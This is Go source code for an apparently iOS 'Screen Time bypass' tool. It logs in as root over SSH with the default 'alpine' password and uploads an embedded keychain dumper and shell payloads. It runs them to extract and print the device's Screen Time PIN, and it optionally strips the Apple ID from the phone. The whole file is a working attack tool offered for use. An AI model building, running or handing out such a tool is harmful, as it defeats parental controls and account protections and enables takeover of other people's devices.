package main

import (
	"bufio"
	_ "embed"
	"github.com/fatih/color"
	"github.com/melbahja/goph"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"
)

//go:embed payload/keychain_dumper
var keychain_dumper []byte

//go:embed payload/run.sh
var main_payload []byte

//go:embed payload/id.sh
var id_payload []byte

//go:embed payload/entitlements.xml
var entitlements []byte

var client *goph.Client

var err error

var uploaded bool

func sendFiles() {
	_ = os.WriteFile("keychain_dumper", keychain_dumper, 0755)
	_ = os.WriteFile("run.sh", main_payload, 0755)
	_ = os.WriteFile("id.sh", id_payload, 0755)
	_ = os.WriteFile("entitlements.xml", entitlements, 0755)

	err := client.Upload("keychain_dumper", "/var/mobile/keychain_dumper")
	_, err = client.Run("chmod a+rx /var/mobile/keychain_dumper")
	err = client.Upload("run.sh", "/var/mobile/run.sh")
	_, err = client.Run("chmod a+rx /var/mobile/run.sh")
	err = client.Upload("id.sh", "/var/mobile/id.sh")
	_, err = client.Run("chmod a+rx /var/mobile/id.sh")
	err = client.Upload("entitlements.xml", "/var/mobile/entitlements.xml")
	err = os.Remove("keychain_dumper")
	err = os.Remove("run.sh")
	err = os.Remove("id.sh")
	err = os.Remove("entitlements.xml")

	if err != nil {
		close(err)
	}

	uploaded = true
}

func initSSH() {
	client, err = goph.NewUnknown("root", "127.0.0.1", goph.Password("alpine"))
	if err != nil {
		color.Red("[*] Error connecting to phone.")
		color.Red("[*] Please make sure your SSH tunnel is active.")
		close(err)
	}
}

func interruptHandler(ch chan os.Signal) {
	_ = <-ch
	close(nil)
}

func main() {
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, os.Interrupt, syscall.SIGTERM)

	go interruptHandler(ch)

	c := color.New(color.FgCyan)

	c.Println("[*] 12Screen bypass by K1ngOfPugs")
	c.Println("[*] Connecting to phone...")

	initSSH()

	c.Println("[*] Connected. Sending payload...")

	sendFiles()

	c.Println("[*] Payload upload complete. Running payload...")
	c.Println("[*] Please authenticate on your device when asked.")

	recv, _ := client.Run("bash -c '/var/mobile/run.sh'")
	out := string(recv)

	c.Println("[*] Payload complete. Your Screentime PIN is: ")
	c.Println("[*] " + color.RedString(out))

	reader := bufio.NewReader(os.Stdin)
	c.Println("[*] Would you like to remove your Apple ID? [y/N]: ")
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(strings.ToLower(input))
	input = string(input[0])

	if input == "y" {
		c.Println("[*] Removing Apple ID...")
		_, _ = client.Run("bash -c '/var/mobile/id.sh'")
	}

	close(nil)
}

func close(err error) {
	if uploaded == true {
		_, err = client.Run("rm /var/mobile/run.sh")
		_, err = client.Run("rm /var/mobile/id.sh")
	}

	if err != nil {
		log.Fatal(err)
	} else {
		os.Exit(0)
	}
}
